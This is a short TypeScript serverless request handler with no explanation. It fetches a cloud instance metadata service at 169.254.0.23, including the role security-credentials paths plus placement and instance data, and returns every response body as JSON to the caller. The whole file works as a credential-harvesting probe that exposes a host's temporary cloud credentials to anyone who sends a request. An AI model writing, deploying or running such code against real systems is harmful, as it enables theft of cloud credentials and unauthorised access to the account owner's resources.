export async function onRequest(context: any): Promise<Response> {
  const metaGet = async (path: string) => {
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 4000);
      const r = await fetch("http://169.254.0.23" + path, { signal: ctrl.signal });
      clearTimeout(t);
      const body = await r.text();
      return { status: r.status, body: body.slice(0, 1000) };
    } catch (e: any) {
      return { status: "err", body: String(e && e.message).slice(0, 150) };
    }
  };
  const out: any = {};
  out.meta_root = await metaGet("/meta-data/");
  out.cam_info = await metaGet("/meta-data/cam/info");
  out.cam_sc = await metaGet("/meta-data/cam/security-credentials/");
  out.cam_sc2 = await metaGet("/cam/security-credentials/");
  out.placement = await metaGet("/meta-data/placement/");
  out.instance = await metaGet("/meta-data/instance/");
  return new Response(JSON.stringify(out), { headers: { "Content-Type": "application/json" } });
}
